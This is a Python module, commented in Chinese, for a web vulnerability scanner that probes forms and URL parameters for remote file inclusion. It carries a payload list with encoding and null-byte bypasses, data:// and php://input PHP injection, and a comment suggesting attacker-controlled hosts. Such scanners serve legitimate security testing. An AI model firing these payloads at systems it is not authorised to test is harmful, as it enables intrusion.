#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
RFI（远程文件包含）扫描器模块，负责扫描RFI漏洞
"""

import re
import logging
import random
import string
import time
from urllib.parse import urlparse, urlencode, parse_qsl, unquote

logger = logging.getLogger('xss_scanner')

class RFIScanner:
    """RFI扫描器类，负责扫描远程文件包含漏洞"""
    
    def __init__(self, http_client):
        """
        初始化RFI扫描器
        
        Args:
            http_client: HTTP客户端对象
        """
        self.http_client = http_client
        
        # 生成随机标记，用于检测RFI漏洞
        self.rfi_mark = 'RFI_' + self._generate_random_string(8)
        
        # RFI检测Payload
        # 注意：在实际使用中，这些应该指向攻击者控制的服务器
        # 出于安全考虑，这里使用的是公共可访问的测试服务
        self.payloads = [
            # 远程文件包含的基本测试
            "http://example.com/rfi_test.txt",
            "https://example.com/rfi_test.php",
            "http://test.example.com/shell.txt",
            
            # 使用不同协议（实际使用中应指向攻击者控制的服务器）
            "ftp://example.com/rfi_test.php",
            "https://raw.githubusercontent.com/some-repo/test/master/info.php",
            
            # 使用端口和认证
            "http://user:password@example.com:8080/rfi_test.php",
            
            # IP地址形式
            "http://127.0.0.1/rfi_test.php",
            "http://192.168.0.1/rfi_test.php",
            "http://[::1]/rfi_test.php",
            
            # 使用单词编码
            "http://%65%78%61%6d%70%6c%65.com/rfi_test.php",
            
            # URL编码绕过
            "http%3A%2F%2Fexample.com%2Frfi_test.php",
            
            # 双重URL编码
            "http%253A%252F%252Fexample.com%252Frfi_test.php",
            
            # 使用空字节截断（适用于某些PHP版本）
            "http://example.com/rfi_test.php%00",
            "http://example.com/rfi_test.php\0",
            
            # 使用注释截断
            "http://example.com/rfi_test.php#",
            "http://example.com/rfi_test.php?",
            
            # 使用双斜杠
            "http://example.com//rfi_test.php",
            
            # 使用数据URI（PHP支持）
            f"data://text/plain;base64,{self._encode_base64(f'<?php echo "{self.rfi_mark}"; ?>')}",
            
            # 使用PHP包装器
            "php://input", 
            
            # 使用file://URL（仅当服务器和攻击者在同一台机器上）
            "file:///var/www/html/rfi_test.php"
        ]
        
        # 可能的RFI成功特征
        self.success_patterns = [
            re.escape(self.rfi_mark),  # 我们的标记
            "root:.*:0:0:",  # 如果包含远程服务器系统文件
            "\\<\\?php",     # PHP代码
            "phpinfo\\(\\)", # PHP信息
            "PHP Version",   # PHP版本信息
            "www-data",      # Web服务用户
            "HTTP_USER_AGENT", # PHP环境变量
            "REMOTE_ADDR",   # PHP环境变量
            "SERVER_ADDR",   # PHP环境变量
            "DOCUMENT_ROOT", # PHP环境变量
            "PATH_TRANSLATED", # PHP环境变量
            "Warning: assert" # PHP警告
        ]
        
        # PHP错误模式，可能表明存在漏洞但无法被成功利用
        self.php_error_patterns = [
            "failed to open stream: HTTP request failed",
            "failed to open stream: Connection refused",
            "failed to open stream: No such file or directory",
            "Deprecated: Directive 'allow_url_include' is deprecated",
            "Warning: include\\(", 
            "Warning: remote_file_inclusion",
            "allow_url_fopen must be enabled",
            "allow_url_include must be enabled",
            "Warning: include_once\\(",
            "Failed to include '"
        ]
    
    def scan_form(self, url, form, field):
        """
        扫描表单中的RFI漏洞
        
        Args:
            url: 页面URL
            form: 表单信息
            field: 字段信息
            
        Returns:
            dict: 漏洞信息，如果没有发现漏洞则返回None
        """
        if not field.get('name'):
            return None
            
        # 可能存在RFI的字段名称
        rfi_prone_fields = [
            'file', 'path', 'page', 'document', 'folder', 'root', 'path',
            'pg', 'style', 'pdf', 'template', 'php_path', 'doc', 'include',
            'inc', 'locate', 'show', 'site', 'view', 'content'
        ]
        
        # 如果字段名不包含敏感关键词，则跳过扫描
        field_name_lower = field['name'].lower()
        if not any(keyword in field_name_lower for keyword in rfi_prone_fields):
            return None
            
        logger.debug(f"扫描RFI: {field['name']} @ {url}")
        
        # 获取表单提交URL
        action_url = form['action'] if form['action'] else url
        
        # 获取表单方法
        method = form['method'].upper()
        
        # 检测RFI漏洞
        for payload in self.payloads:
            # 构建表单数据
            form_data = {}
            
            # 填充所有字段
            for f in form.get('fields', []):
                if f.get('name'):
                    # 如果是目标字段，则使用Payload
                    if f['name'] == field['name']:
                        form_data[f['name']] = payload
                    else:
                        # 否则使用默认值
                        form_data[f['name']] = f.get('value', '')
            
            # 如果是data://或php://输入，需要准备额外的数据
            post_data = None
            if payload == "php://input":
                post_data = f"<?php echo '{self.rfi_mark}'; ?>"
                
            # 发送请求
            try:
                logger.debug(f"测试Payload: {payload}")
                
                if method == 'POST':
                    if post_data:
                        # 对于php://input，需要直接发送PHP代码
                        response = self.http_client.post(action_url, data=form_data, 
                                                         headers={"Content-Type": "application/x-www-form-urlencoded"}, 
                                                         body=post_data)
                    else:
                        response = self.http_client.post(action_url, data=form_data)
                else:
                    response = self.http_client.get(action_url, params=form_data)
                    
                if not response:
                    continue
                    
                # 检查响应中是否包含成功特征
                if self._check_rfi_success(response.text):
                    return {
                        'type': 'RFI',
                        'url': url,
                        'form_action': action_url,
                        'form_method': method,
                        'parameter': field['name'],
                        'payload': payload,
                        'severity': '高',
                        'description': f"在表单字段'{field['name']}'中发现远程文件包含(RFI)漏洞",
                        'details': f"表单提交到{action_url}的{field['name']}字段存在RFI漏洞，可以执行远程服务器上的代码",
                        'recommendation': "禁用PHP的allow_url_fopen和allow_url_include选项，实施白名单验证，使用间接引用"
                    }
            except Exception as e:
                logger.error(f"扫描RFI时发生错误: {str(e)}")
                
        return None
    
    def scan_parameter(self, url, param):
        """
        扫描URL参数中的RFI漏洞
        
        Args:
            url: 页面URL
            param: 参数名
            
        Returns:
            dict: 漏洞信息，如果没有发现漏洞则返回None
        """
        # 可能存在RFI的参数名称
        rfi_prone_params = [
            'file', 'path', 'page', 'document', 'folder', 'root', 'path',
            'pg', 'style', 'pdf', 'template', 'php_path', 'doc', 'include',
            'inc', 'locate', 'show', 'site', 'view', 'content'
        ]
        
        # 如果参数名不包含敏感关键词，则跳过扫描
        param_lower = param.lower()
        if not any(keyword in param_lower for keyword in rfi_prone_params):
            return None
            
        logger.debug(f"扫描RFI参数: {param} @ {url}")
        
        # 解析URL
        parsed_url = urlparse(url)
        
        # 获取查询参数
        query_params = dict(parse_qsl(parsed_url.query))
        
        # 如果参数不存在，则添加
        if param not in query_params:
            query_params[param] = ""
            
        # 构建基础URL
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        
        # 检测RFI漏洞
        for payload in self.payloads:
            # 构建注入参数
            inject_params = query_params.copy()
            inject_params[param] = payload
            
            # 构建测试URL
            query_string = urlencode(inject_params)
            test_url = f"{base_url}?{query_string}"
            
            # 如果是data://或php://输入，需要准备额外的数据
            post_data = None
            if payload == "php://input":
                post_data = f"<?php echo '{self.rfi_mark}'; ?>"
                
            try:
                logger.debug(f"测试Payload: {payload}")
                
                # 发送请求
                if post_data:
                    # 对于php://input，需要直接发送PHP代码
                    response = self.http_client.request("POST", test_url, 
                                                       headers={"Content-Type": "application/x-www-form-urlencoded"}, 
                                                       data=post_data)
                else:
                    response = self.http_client.get(test_url)
                
                if not response:
                    continue
                    
                # 检查响应中是否包含成功特征
                if self._check_rfi_success(response.text):
                    return {
                        'type': 'RFI',
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'severity': '高',
                        'description': f"在URL参数'{param}'中发现远程文件包含(RFI)漏洞",
                        'details': f"URL参数{param}存在RFI漏洞，可以执行远程服务器上的代码",
                        'recommendation': "禁用PHP的allow_url_fopen和allow_url_include选项，实施白名单验证，使用间接引用"
                    }
            except Exception as e:
                logger.error(f"扫描RFI参数时发生错误: {str(e)}")
                
        return None
    
    def _check_rfi_success(self, content):
        """
        检查响应内容中是否包含RFI成功的特征
        
        Args:
            content: 响应内容
            
        Returns:
            bool: 是否包含RFI成功特征
        """
        if not content:
            return False
            
        # 检查成功特征
        for pattern in self.success_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True
                
        # 检查PHP错误信息特征，但需要进一步验证
        for pattern in self.php_error_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                # 如果响应中包含某些服务器信息，可能表明漏洞可以被进一步利用
                if re.search("/(var|etc|usr|opt|home)/", content):
                    return True
                if re.search("([A-Za-z]:\\\\|System32|Program Files)", content):
                    return True
                    
        return False
    
    def _generate_random_string(self, length=8):
        """
        生成随机字符串
        
        Args:
            length: 字符串长度
            
        Returns:
            str: 随机字符串
        """
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for _ in range(length))
    
    def _encode_base64(self, text):
        """
        Base64编码
        
        Args:
            text: 要编码的文本
            
        Returns:
            str: Base64编码后的字符串
        """
        import base64
        return base64.b64encode(text.encode()).decode()
    
    def can_scan_form(self):
        """是否可以扫描表单"""
        return True
    
    def can_scan_params(self):
        """是否可以扫描URL参数"""
        return True 